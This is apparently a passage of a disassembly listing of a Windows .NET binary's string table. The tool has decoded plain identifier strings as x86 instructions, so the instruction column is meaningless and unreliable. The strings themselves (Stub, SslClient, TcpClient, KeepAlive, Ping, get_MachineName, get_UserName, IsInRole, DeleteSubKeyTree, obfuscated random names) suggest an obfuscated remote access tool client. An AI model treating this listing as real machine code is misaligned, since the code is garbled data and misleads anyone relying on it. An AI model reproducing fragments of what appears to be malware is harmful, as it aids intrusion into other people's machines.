  407fb7:	69 62 00 53 74 75 62 	imul   $0x62757453,0x0(%edx),%esp
  407fbe:	00 6c 53 42          	add    %ch,0x42(%ebx,%edx,2)
  407fc2:	4b                   	dec    %ebx
  407fc3:	6e                   	outsb  %ds:(%esi),(%dx)
  407fc4:	6a 4d                	push   $0x4d
  407fc6:	6d                   	insl   (%dx),%es:(%edi)
  407fc7:	54                   	push   %esp
  407fc8:	54                   	push   %esp
  407fc9:	78 53                	js     0x40801e
  407fcb:	76 62                	jbe    0x40802f
  407fcd:	00 6a 67             	add    %ch,0x67(%edx)
  407fd0:	6b 43 56 49          	imul   $0x49,0x56(%ebx),%eax
  407fd4:	4a                   	dec    %edx
  407fd5:	6a 46                	push   $0x46
  407fd7:	52                   	push   %edx
  407fd8:	69 41 63 00 63 78 62 	imul   $0x62786300,0x63(%ecx),%eax
  407fdf:	77 59                	ja     0x40803a
  407fe1:	6d                   	insl   (%dx),%es:(%edi)
  407fe2:	69 48 67 46 76 48 4f 	imul   $0x4f487646,0x67(%eax),%ecx
  407fe9:	49                   	dec    %ecx
  407fea:	5a                   	pop    %edx
  407feb:	63 00                	arpl   %eax,(%eax)
  407fed:	53                   	push   %ebx
  407fee:	79 73                	jns    0x408063
  407ff0:	74 65                	je     0x408057
  407ff2:	6d                   	insl   (%dx),%es:(%edi)
  407ff3:	2e 43                	cs inc %ebx
  407ff5:	6f                   	outsl  %ds:(%esi),(%dx)
  407ff6:	6c                   	insb   (%dx),%es:(%edi)
  407ff7:	6c                   	insb   (%dx),%es:(%edi)
  407ff8:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  407ffd:	6e                   	outsb  %ds:(%esi),(%dx)
  407ffe:	73 2e                	jae    0x40802e
  408000:	47                   	inc    %edi
  408001:	65 6e                	outsb  %gs:(%esi),(%dx)
  408003:	65 72 69             	gs jb  0x40806f
  408006:	63 00                	arpl   %eax,(%eax)
  408008:	4d                   	dec    %ebp
  408009:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408010:	74 2e                	je     0x408040
  408012:	56                   	push   %esi
  408013:	69 73 75 61 6c 42 61 	imul   $0x61426c61,0x75(%ebx),%esi
  40801a:	73 69                	jae    0x408085
  40801c:	63 00                	arpl   %eax,(%eax)
  40801e:	75 4f                	jne    0x40806f
  408020:	57                   	push   %edi
  408021:	79 42                	jns    0x408065
  408023:	4c                   	dec    %esp
  408024:	6b 43 55 42          	imul   $0x42,0x55(%ebx),%eax
  408028:	6d                   	insl   (%dx),%es:(%edi)
  408029:	63 00                	arpl   %eax,(%eax)
  40802b:	67 65 74 5f          	addr16 gs je 0x40808e
  40802f:	53                   	push   %ebx
  408030:	65 6e                	outsb  %gs:(%esi),(%dx)
  408032:	64 53                	fs push %ebx
  408034:	79 6e                	jns    0x4080a4
  408036:	63 00                	arpl   %eax,(%eax)
  408038:	57                   	push   %edi
  408039:	78 47                	js     0x408082
  40803b:	4b                   	dec    %ebx
  40803c:	43                   	inc    %ebx
  40803d:	42                   	inc    %edx
  40803e:	53                   	push   %ebx
  40803f:	76 6b                	jbe    0x4080ac
  408041:	72 64                	jb     0x4080a7
  408043:	56                   	push   %esi
  408044:	71 63                	jno    0x4080a9
  408046:	00 44 56 41          	add    %al,0x41(%esi,%edx,2)
  40804a:	43                   	inc    %ebx
  40804b:	6f                   	outsl  %ds:(%esi),(%dx)
  40804c:	54                   	push   %esp
  40804d:	6d                   	insl   (%dx),%es:(%edi)
  40804e:	44                   	inc    %esp
  40804f:	7a 63                	jp     0x4080b4
  408051:	00 43 49             	add    %al,0x49(%ebx)
  408054:	58                   	pop    %eax
  408055:	76 50                	jbe    0x4080a7
  408057:	58                   	pop    %eax
  408058:	67 53                	addr16 push %ebx
  40805a:	67 45                	addr16 inc %ebp
  40805c:	59                   	pop    %ecx
  40805d:	50                   	push   %eax
  40805e:	6f                   	outsl  %ds:(%esi),(%dx)
  40805f:	70 75                	jo     0x4080d6
  408061:	45                   	inc    %ebp
  408062:	64 00 74 51 57       	add    %dh,%fs:0x57(%ecx,%edx,2)
  408067:	6d                   	insl   (%dx),%es:(%edi)
  408068:	65 76 55             	gs jbe 0x4080c0
  40806b:	69 45 48 64 00 67 65 	imul   $0x65670064,0x48(%ebp),%eax
  408072:	74 5f                	je     0x4080d3
  408074:	49                   	dec    %ecx
  408075:	64 00 6c 41 59       	add    %ch,%fs:0x59(%ecx,%eax,2)
  40807a:	53                   	push   %ebx
  40807b:	6f                   	outsl  %ds:(%esi),(%dx)
  40807c:	72 46                	jb     0x4080c4
  40807e:	73 73                	jae    0x4080f3
  408080:	4e                   	dec    %esi
  408081:	4e                   	dec    %esi
  408082:	5a                   	pop    %edx
  408083:	4e                   	dec    %esi
  408084:	64 00 69 49          	add    %ch,%fs:0x49(%ecx)
  408088:	49                   	dec    %ecx
  408089:	49                   	dec    %ecx
  40808a:	68 62 76 7a 78       	push   $0x787a7662
  40808f:	70 71                	jo     0x408102
  408091:	58                   	pop    %eax
  408092:	43                   	inc    %ebx
  408093:	50                   	push   %eax
  408094:	64 00 45 6e          	add    %al,%fs:0x6e(%ebp)
  408098:	64 52                	fs push %edx
  40809a:	65 61                	gs popa
  40809c:	64 00 42 65          	add    %al,%fs:0x65(%edx)
  4080a0:	67 69 6e 52 65 61 64 	imul   $0x646165,0x52(%bp),%ebp
  4080a7:	00 
  4080a8:	54                   	push   %esp
  4080a9:	68 72 65 61 64       	push   $0x64616572
  4080ae:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  4080b2:	64 00 41 64          	add    %al,%fs:0x64(%ecx)
  4080b6:	64 00 53 48          	add    %dl,%fs:0x48(%ebx)
  4080ba:	41                   	inc    %ecx
  4080bb:	32 35 36 4d 61 6e    	xor    0x6e614d36,%dh
  4080c1:	61                   	popa
  4080c2:	67 65 64 00 67 65    	gs add %ah,%fs:0x65(%bx)
  4080c8:	74 5f                	je     0x408129
  4080ca:	43                   	inc    %ebx
  4080cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4080cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4080cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4080ce:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4080d3:	00 67 65             	add    %ah,0x65(%edi)
  4080d6:	74 5f                	je     0x408137
  4080d8:	49                   	dec    %ecx
  4080d9:	73 43                	jae    0x40811e
  4080db:	6f                   	outsl  %ds:(%esi),(%dx)
  4080dc:	6e                   	outsb  %ds:(%esi),(%dx)
  4080dd:	6e                   	outsb  %ds:(%esi),(%dx)
  4080de:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4080e3:	00 73 65             	add    %dh,0x65(%ebx)
  4080e6:	74 5f                	je     0x408147
  4080e8:	49                   	dec    %ecx
  4080e9:	73 43                	jae    0x40812e
  4080eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4080ec:	6e                   	outsb  %ds:(%esi),(%dx)
  4080ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4080ee:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  4080f3:	00 67 65             	add    %ah,0x65(%edi)
  4080f6:	74 5f                	je     0x408157
  4080f8:	47                   	inc    %edi
  4080f9:	75 69                	jne    0x408164
  4080fb:	64 00 3c 53          	add    %bh,%fs:(%ebx,%edx,2)
  4080ff:	65 6e                	outsb  %gs:(%esi),(%dx)
  408101:	64 53                	fs push %ebx
  408103:	79 6e                	jns    0x408173
  408105:	63 3e                	arpl   %edi,(%esi)
  408107:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  40810b:	61                   	popa
  40810c:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40810f:	6e                   	outsb  %ds:(%esi),(%dx)
  408110:	67 46                	addr16 inc %esi
  408112:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  408119:	73 43                	jae    0x40815e
  40811b:	6f                   	outsl  %ds:(%esi),(%dx)
  40811c:	6e                   	outsb  %ds:(%esi),(%dx)
  40811d:	6e                   	outsb  %ds:(%esi),(%dx)
  40811e:	65 63 74 65 64       	arpl   %esi,%gs:0x64(%ebp,%eiz,2)
  408123:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  408128:	61                   	popa
  408129:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  40812c:	6e                   	outsb  %ds:(%esi),(%dx)
  40812d:	67 46                	addr16 inc %esi
  40812f:	69 65 6c 64 00 3c 4b 	imul   $0x4b3c0064,0x6c(%ebp),%esp
  408136:	65 65 70 41          	gs gs jo 0x40817b
  40813a:	6c                   	insb   (%dx),%es:(%edi)
  40813b:	69 76 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%esi),%esi
  408142:	42                   	inc    %edx
  408143:	61                   	popa
  408144:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408147:	6e                   	outsb  %ds:(%esi),(%dx)
  408148:	67 46                	addr16 inc %esi
  40814a:	69 65 6c 64 00 3c 48 	imul   $0x483c0064,0x6c(%ebp),%esp
  408151:	65 61                	gs popa
  408153:	64 65 72 53          	fs gs jb 0x4081aa
  408157:	69 7a 65 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x65(%edx),%edi
  40815e:	42                   	inc    %edx
  40815f:	61                   	popa
  408160:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408163:	6e                   	outsb  %ds:(%esi),(%dx)
  408164:	67 46                	addr16 inc %esi
  408166:	69 65 6c 64 00 3c 50 	imul   $0x503c0064,0x6c(%ebp),%esp
  40816d:	69 6e 67 3e 6b 5f 5f 	imul   $0x5f5f6b3e,0x67(%esi),%ebp
  408174:	42                   	inc    %edx
  408175:	61                   	popa
  408176:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408179:	6e                   	outsb  %ds:(%esi),(%dx)
  40817a:	67 46                	addr16 inc %esi
  40817c:	69 65 6c 64 00 3c 49 	imul   $0x493c0064,0x6c(%ebp),%esp
  408183:	6e                   	outsb  %ds:(%esi),(%dx)
  408184:	74 65                	je     0x4081eb
  408186:	72 76                	jb     0x4081fe
  408188:	61                   	popa
  408189:	6c                   	insb   (%dx),%es:(%edi)
  40818a:	3e 6b 5f 5f 42       	imul   $0x42,%ds:0x5f(%edi),%ebx
  40818f:	61                   	popa
  408190:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  408193:	6e                   	outsb  %ds:(%esi),(%dx)
  408194:	67 46                	addr16 inc %esi
  408196:	69 65 6c 64 00 3c 42 	imul   $0x423c0064,0x6c(%ebp),%esp
  40819d:	75 66                	jne    0x408205
  40819f:	66 65 72 3e          	data16 gs jb 0x4081e1
  4081a3:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4081a7:	61                   	popa
  4081a8:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4081ab:	6e                   	outsb  %ds:(%esi),(%dx)
  4081ac:	67 46                	addr16 inc %esi
  4081ae:	69 65 6c 64 00 3c 4f 	imul   $0x4f3c0064,0x6c(%ebp),%esp
  4081b5:	66 66 73 65          	data16 data16 jae 0x40821e
  4081b9:	74 3e                	je     0x4081f9
  4081bb:	6b 5f 5f 42          	imul   $0x42,0x5f(%edi),%ebx
  4081bf:	61                   	popa
  4081c0:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4081c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4081c4:	67 46                	addr16 inc %esi
  4081c6:	69 65 6c 64 00 3c 53 	imul   $0x533c0064,0x6c(%ebp),%esp
  4081cd:	73 6c                	jae    0x40823b
  4081cf:	43                   	inc    %ebx
  4081d0:	6c                   	insb   (%dx),%es:(%edi)
  4081d1:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  4081d8:	5f                   	pop    %edi
  4081d9:	42                   	inc    %edx
  4081da:	61                   	popa
  4081db:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4081de:	6e                   	outsb  %ds:(%esi),(%dx)
  4081df:	67 46                	addr16 inc %esi
  4081e1:	69 65 6c 64 00 3c 54 	imul   $0x543c0064,0x6c(%ebp),%esp
  4081e8:	63 70 43             	arpl   %esi,0x43(%eax)
  4081eb:	6c                   	insb   (%dx),%es:(%edi)
  4081ec:	69 65 6e 74 3e 6b 5f 	imul   $0x5f6b3e74,0x6e(%ebp),%esp
  4081f3:	5f                   	pop    %edi
  4081f4:	42                   	inc    %edx
  4081f5:	61                   	popa
  4081f6:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  4081f9:	6e                   	outsb  %ds:(%esi),(%dx)
  4081fa:	67 46                	addr16 inc %esi
  4081fc:	69 65 6c 64 00 41 70 	imul   $0x70410064,0x6c(%ebp),%esp
  408203:	70 65                	jo     0x40826a
  408205:	6e                   	outsb  %ds:(%esi),(%dx)
  408206:	64 00 52 65          	add    %dl,%fs:0x65(%edx)
  40820a:	67 69 73 74 72 79 56 	imul   $0x61567972,0x74(%bp,%di),%esi
  408211:	61 
  408212:	6c                   	insb   (%dx),%es:(%edi)
  408213:	75 65                	jne    0x40827a
  408215:	4b                   	dec    %ebx
  408216:	69 6e 64 00 6d 6b 79 	imul   $0x796b6d00,0x64(%esi),%ebp
  40821d:	4b                   	dec    %ebx
  40821e:	46                   	inc    %esi
  40821f:	78 6d                	js     0x40828e
  408221:	48                   	dec    %eax
  408222:	64 6d                	fs insl (%dx),%es:(%edi)
  408224:	73 64                	jae    0x40828a
  408226:	00 74 4f 4d          	add    %dh,0x4d(%edi,%ecx,2)
  40822a:	66 46                	inc    %si
  40822c:	72 48                	jb     0x408276
  40822e:	49                   	dec    %ecx
  40822f:	49                   	dec    %ecx
  408230:	70 44                	jo     0x408276
  408232:	48                   	dec    %eax
  408233:	46                   	inc    %esi
  408234:	65 00 70 59          	add    %dh,%gs:0x59(%eax)
  408238:	69 68 76 50 78 75 49 	imul   $0x49757850,0x76(%eax),%ebp
  40823f:	65 00 42 6d          	add    %al,%gs:0x6d(%edx)
  408243:	75 6a                	jne    0x4082af
  408245:	5a                   	pop    %edx
  408246:	59                   	pop    %ecx
  408247:	44                   	inc    %esp
  408248:	58                   	pop    %eax
  408249:	69 65 4b 65 00 68 78 	imul   $0x78680065,0x4b(%ebp),%esp
  408250:	4e                   	dec    %esi
  408251:	63 72 44             	arpl   %esi,0x44(%edx)
  408254:	59                   	pop    %ecx
  408255:	79 4f                	jns    0x4082a6
  408257:	4f                   	dec    %edi
  408258:	65 00 52 65          	add    %dl,%gs:0x65(%edx)
  40825c:	70 6c                	jo     0x4082ca
  40825e:	61                   	popa
  40825f:	63 65 00             	arpl   %esp,0x0(%ebp)
  408262:	43                   	inc    %ebx
  408263:	72 65                	jb     0x4082ca
  408265:	61                   	popa
  408266:	74 65                	je     0x4082cd
  408268:	49                   	dec    %ecx
  408269:	6e                   	outsb  %ds:(%esi),(%dx)
  40826a:	73 74                	jae    0x4082e0
  40826c:	61                   	popa
  40826d:	6e                   	outsb  %ds:(%esi),(%dx)
  40826e:	63 65 00             	arpl   %esp,0x0(%ebp)
  408271:	73 65                	jae    0x4082d8
  408273:	74 5f                	je     0x4082d4
  408275:	4d                   	dec    %ebp
  408276:	6f                   	outsl  %ds:(%esi),(%dx)
  408277:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  40827c:	6c                   	insb   (%dx),%es:(%edi)
  40827d:	65 4d                	gs dec %ebp
  40827f:	6f                   	outsl  %ds:(%esi),(%dx)
  408280:	64 65 00 50 61       	fs add %dl,%gs:0x61(%eax)
  408285:	64 64 69 6e 67 4d 6f 	fs imul $0x65646f4d,%fs:0x67(%esi),%ebp
  40828c:	64 65 
  40828e:	00 45 6e             	add    %al,0x6e(%ebp)
  408291:	74 65                	je     0x4082f8
  408293:	72 44                	jb     0x4082d9
  408295:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  408299:	4d                   	dec    %ebp
  40829a:	6f                   	outsl  %ds:(%esi),(%dx)
  40829b:	64 65 00 43 72       	fs add %al,%gs:0x72(%ebx)
  4082a0:	79 70                	jns    0x408312
  4082a2:	74 6f                	je     0x408313
  4082a4:	53                   	push   %ebx
  4082a5:	74 72                	je     0x408319
  4082a7:	65 61                	gs popa
  4082a9:	6d                   	insl   (%dx),%es:(%edi)
  4082aa:	4d                   	dec    %ebp
  4082ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4082ac:	64 65 00 43 6f       	fs add %al,%gs:0x6f(%ebx)
  4082b1:	6d                   	insl   (%dx),%es:(%edi)
  4082b2:	70 72                	jo     0x408326
  4082b4:	65 73 73             	gs jae 0x40832a
  4082b7:	69 6f 6e 4d 6f 64 65 	imul   $0x65646f4d,0x6e(%edi),%ebp
  4082be:	00 43 69             	add    %al,0x69(%ebx)
  4082c1:	70 68                	jo     0x40832b
  4082c3:	65 72 4d             	gs jb  0x408313
  4082c6:	6f                   	outsl  %ds:(%esi),(%dx)
  4082c7:	64 65 00 53 65       	fs add %dl,%gs:0x65(%ebx)
  4082cc:	6c                   	insb   (%dx),%es:(%edi)
  4082cd:	65 63 74 4d 6f       	arpl   %esi,%gs:0x6f(%ebp,%ecx,2)
  4082d2:	64 65 00 44 65 6c    	fs add %al,%gs:0x6c(%ebp,%eiz,2)
  4082d8:	65 74 65             	gs je  0x408340
  4082db:	53                   	push   %ebx
  4082dc:	75 62                	jne    0x408340
  4082de:	4b                   	dec    %ebx
  4082df:	65 79 54             	gs jns 0x408336
  4082e2:	72 65                	jb     0x408349
  4082e4:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4082e8:	74 5f                	je     0x408349
  4082ea:	4d                   	dec    %ebp
  4082eb:	65 73 73             	gs jae 0x408361
  4082ee:	61                   	popa
  4082ef:	67 65 00 49 6e       	add    %cl,%gs:0x6e(%bx,%di)
  4082f4:	76 6f                	jbe    0x408365
  4082f6:	6b 65 00 49          	imul   $0x49,0x0(%ebp),%esp
  4082fa:	45                   	inc    %ebp
  4082fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4082fc:	75 6d                	jne    0x40836b
  4082fe:	65 72 61             	gs jb  0x408362
  408301:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  408305:	49                   	dec    %ecx
  408306:	44                   	inc    %esp
  408307:	69 73 70 6f 73 61 62 	imul   $0x6261736f,0x70(%ebx),%esi
  40830e:	6c                   	insb   (%dx),%es:(%edi)
  40830f:	65 00 54 6f 44       	add    %dl,%gs:0x44(%edi,%ebp,2)
  408314:	6f                   	outsl  %ds:(%esi),(%dx)
  408315:	75 62                	jne    0x408379
  408317:	6c                   	insb   (%dx),%es:(%edi)
  408318:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  40831c:	74 5f                	je     0x40837d
  40831e:	48                   	dec    %eax
  40831f:	61                   	popa
  408320:	6e                   	outsb  %ds:(%esi),(%dx)
  408321:	64 6c                	fs insb (%dx),%es:(%edi)
  408323:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  408327:	6e                   	outsb  %ds:(%esi),(%dx)
  408328:	74 69                	je     0x408393
  40832a:	6d                   	insl   (%dx),%es:(%edi)
  40832b:	65 46                	gs inc %esi
  40832d:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  408334:	64 6c                	fs insb (%dx),%es:(%edi)
  408336:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40833a:	74 4d                	je     0x408389
  40833c:	6f                   	outsl  %ds:(%esi),(%dx)
  40833d:	64 75 6c             	fs jne 0x4083ac
  408340:	65 48                	gs dec %eax
  408342:	61                   	popa
  408343:	6e                   	outsb  %ds:(%esi),(%dx)
  408344:	64 6c                	fs insb (%dx),%es:(%edi)
  408346:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  40834a:	6e                   	outsb  %ds:(%esi),(%dx)
  40834b:	74 69                	je     0x4083b6
  40834d:	6d                   	insl   (%dx),%es:(%edi)
  40834e:	65 54                	gs push %esp
  408350:	79 70                	jns    0x4083c2
  408352:	65 48                	gs dec %eax
  408354:	61                   	popa
  408355:	6e                   	outsb  %ds:(%esi),(%dx)
  408356:	64 6c                	fs insb (%dx),%es:(%edi)
  408358:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  40835c:	74 54                	je     0x4083b2
  40835e:	79 70                	jns    0x4083d0
  408360:	65 46                	gs inc %esi
  408362:	72 6f                	jb     0x4083d3
  408364:	6d                   	insl   (%dx),%es:(%edi)
  408365:	48                   	dec    %eax
  408366:	61                   	popa
  408367:	6e                   	outsb  %ds:(%esi),(%dx)
  408368:	64 6c                	fs insb (%dx),%es:(%edi)
  40836a:	65 00 57 61          	add    %dl,%gs:0x61(%edi)
  40836e:	69 74 48 61 6e 64 6c 	imul   $0x656c646e,0x61(%eax,%ecx,2),%esi
  408375:	65 
  408376:	00 54 6f 53          	add    %dl,0x53(%edi,%ebp,2)
  40837a:	69 6e 67 6c 65 00 46 	imul   $0x4600656c,0x67(%esi),%ebp
  408381:	69 6c 65 00 49 73 49 	imul   $0x6e497349,0x0(%ebp,%eiz,2),%ebp
  408388:	6e 
  408389:	52                   	push   %edx
  40838a:	6f                   	outsl  %ds:(%esi),(%dx)
  40838b:	6c                   	insb   (%dx),%es:(%edi)
  40838c:	65 00 57 69          	add    %dl,%gs:0x69(%edi)
  408390:	6e                   	outsb  %ds:(%esi),(%dx)
  408391:	64 6f                	outsl  %fs:(%esi),(%dx)
  408393:	77 73                	ja     0x408408
  408395:	42                   	inc    %edx
  408396:	75 69                	jne    0x408401
  408398:	6c                   	insb   (%dx),%es:(%edi)
  408399:	74 49                	je     0x4083e4
  40839b:	6e                   	outsb  %ds:(%esi),(%dx)
  40839c:	52                   	push   %edx
  40839d:	6f                   	outsl  %ds:(%esi),(%dx)
  40839e:	6c                   	insb   (%dx),%es:(%edi)
  40839f:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4083a3:	74 5f                	je     0x408404
  4083a5:	4d                   	dec    %ebp
  4083a6:	61                   	popa
  4083a7:	69 6e 4d 6f 64 75 6c 	imul   $0x6c75646f,0x4d(%esi),%ebp
  4083ae:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4083b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4083b3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4083b6:	73 4d                	jae    0x408405
  4083b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4083b9:	64 75 6c             	fs jne 0x408428
  4083bc:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4083c0:	74 5f                	je     0x408421
  4083c2:	57                   	push   %edi
  4083c3:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4083ca:	79 6c                	jns    0x408438
  4083cc:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4083d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4083d1:	63 65 73             	arpl   %esp,0x73(%ebp)
  4083d4:	73 57                	jae    0x40842d
  4083d6:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4083dd:	79 6c                	jns    0x40844b
  4083df:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4083e3:	74 5f                	je     0x408444
  4083e5:	46                   	inc    %esi
  4083e6:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4083ed:	00 
  4083ee:	73 65                	jae    0x408455
  4083f0:	74 5f                	je     0x408451
  4083f2:	46                   	inc    %esi
  4083f3:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4083fa:	00 
  4083fb:	47                   	inc    %edi
  4083fc:	65 74 54             	gs je  0x408453
  4083ff:	65 6d                	gs insl (%dx),%es:(%edi)
  408401:	70 46                	jo     0x408449
  408403:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40840a:	00 
  40840b:	47                   	inc    %edi
  40840c:	65 74 46             	gs je  0x408455
  40840f:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  408416:	00 
  408417:	67 65 74 5f          	addr16 gs je 0x40847a
  40841b:	4d                   	dec    %ebp
  40841c:	61                   	popa
  40841d:	63 68 69             	arpl   %ebp,0x69(%eax)
  408420:	6e                   	outsb  %ds:(%esi),(%dx)
  408421:	65 4e                	gs dec %esi
  408423:	61                   	popa
  408424:	6d                   	insl   (%dx),%es:(%edi)
  408425:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408429:	74 5f                	je     0x40848a
  40842b:	4f                   	dec    %edi
  40842c:	53                   	push   %ebx
  40842d:	46                   	inc    %esi
  40842e:	75 6c                	jne    0x40849c
  408430:	6c                   	insb   (%dx),%es:(%edi)
  408431:	4e                   	dec    %esi
  408432:	61                   	popa
  408433:	6d                   	insl   (%dx),%es:(%edi)
  408434:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408438:	74 5f                	je     0x408499
  40843a:	46                   	inc    %esi
  40843b:	75 6c                	jne    0x4084a9
  40843d:	6c                   	insb   (%dx),%es:(%edi)
  40843e:	4e                   	dec    %esi
  40843f:	61                   	popa
  408440:	6d                   	insl   (%dx),%es:(%edi)
  408441:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  408445:	74 5f                	je     0x4084a6
  408447:	55                   	push   %ebp
  408448:	73 65                	jae    0x4084af
  40844a:	72 4e                	jb     0x40849a
  40844c:	61                   	popa
  40844d:	6d                   	insl   (%dx),%es:(%edi)
  40844e:	65 00 43 68          	add    %al,%gs:0x68(%ebx)
  408452:	65 63 6b 48          	arpl   %ebp,%gs:0x48(%ebx)
  408456:	6f                   	outsl  %ds:(%esi),(%dx)
  408457:	73 74                	jae    0x4084cd
  408459:	4e                   	dec    %esi
  40845a:	61                   	popa
  40845b:	6d                   	insl   (%dx),%es:(%edi)
  40845c:	65 00 44 61 74       	add    %al,%gs:0x74(%ecx,%eiz,2)
  408461:	65 54                	gs push %esp
  408463:	69 6d 65 00 67 65 74 	imul   $0x74656700,0x65(%ebp),%ebp
  40846a:	5f                   	pop    %edi
  40846b:	4c                   	dec    %esp
  40846c:	61                   	popa
  40846d:	73 74                	jae    0x4084e3
  40846f:	57                   	push   %edi
  408470:	72 69                	jb     0x4084db
  408472:	74 65                	je     0x4084d9
  408474:	54                   	push   %esp
  408475:	69 6d 65 00 54 6f 55 	imul   $0x556f5400,0x65(%ebp),%ebp
  40847c:	6e                   	outsb  %ds:(%esi),(%dx)
  40847d:	69 76 65 72 73 61 6c 	imul   $0x6c617372,0x65(%esi),%esi
  408484:	54                   	push   %esp
  408485:	69 6d 65 00 57 72 69 	imul   $0x69725700,0x65(%ebp),%ebp
  40848c:	74 65                	je     0x4084f3
  40848e:	4c                   	dec    %esp
  40848f:	69 6e 65 00 43 6f 6d 	imul   $0x6d6f4300,0x65(%esi),%ebp
  408496:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  408499:	65 00 55 72          	add    %dl,%gs:0x72(%ebp)
  40849d:	69 48 6f 73 74 4e 61 	imul   $0x614e7473,0x6f(%eax),%ecx
  4084a4:	6d                   	insl   (%dx),%es:(%edi)
  4084a5:	65 54                	gs push %esp
  4084a7:	79 70                	jns    0x408519
  4084a9:	65 00 67 65          	add    %ah,%gs:0x65(%edi)
  4084ad:	74 5f                	je     0x40850e
  4084af:	56                   	push   %esi
  4084b0:	61                   	popa
  4084b1:	6c                   	insb   (%dx),%es:(%edi)
  4084b2:	75 65                	jne    0x408519
  4084b4:	54                   	push   %esp
  4084b5:	79 70                	jns    0x408527
  4084b7:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  4084bb:	6f                   	outsl  %ds:(%esi),(%dx)
  4084bc:	74 6f                	je     0x40852d
  4084be:	63 6f 6c             	arpl   %ebp,0x6c(%edi)
  4084c1:	54                   	push   %esp
  4084c2:	79 70                	jns    0x408534
  4084c4:	65 00 47 65          	add    %al,%gs:0x65(%edi)
  4084c8:	74 54                	je     0x40851e
  4084ca:	79 70                	jns    0x40853c
  4084cc:	65 00 53 6f          	add    %dl,%gs:0x6f(%ebx)
  4084d0:	63 6b 65             	arpl   %ebp,0x65(%ebx)
  4084d3:	74 54                	je     0x408529
  4084d5:	79 70                	jns    0x408547
  4084d7:	65 00 46 69          	add    %al,%gs:0x69(%esi)
  4084db:	6c                   	insb   (%dx),%es:(%edi)
  4084dc:	65 53                	gs push %ebx
  4084de:	68 61 72 65 00       	push   $0x657261
  4084e3:	53                   	push   %ebx
  4084e4:	79 73                	jns    0x408559
  4084e6:	74 65                	je     0x40854d
  4084e8:	6d                   	insl   (%dx),%es:(%edi)
  4084e9:	2e 43                	cs inc %ebx
  4084eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4084ec:	72 65                	jb     0x408553
  4084ee:	00 43 6c             	add    %al,0x6c(%ebx)
  4084f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4084f2:	73 65                	jae    0x408559
  4084f4:	00 44 69 73          	add    %al,0x73(%ecx,%ebp,2)
  4084f8:	70 6f                	jo     0x408569
  4084fa:	73 65                	jae    0x408561
  4084fc:	00 50 61             	add    %dl,0x61(%eax)
  4084ff:	72 73                	jb     0x408574
  408501:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  408505:	72 52                	jb     0x408559
  408507:	65 76 65             	gs jbe 0x40856f
  40850a:	72 73                	jb     0x40857f
  40850c:	65 00 58 35          	add    %bl,%gs:0x35(%eax)
  408510:	30 39                	xor    %bh,(%ecx)
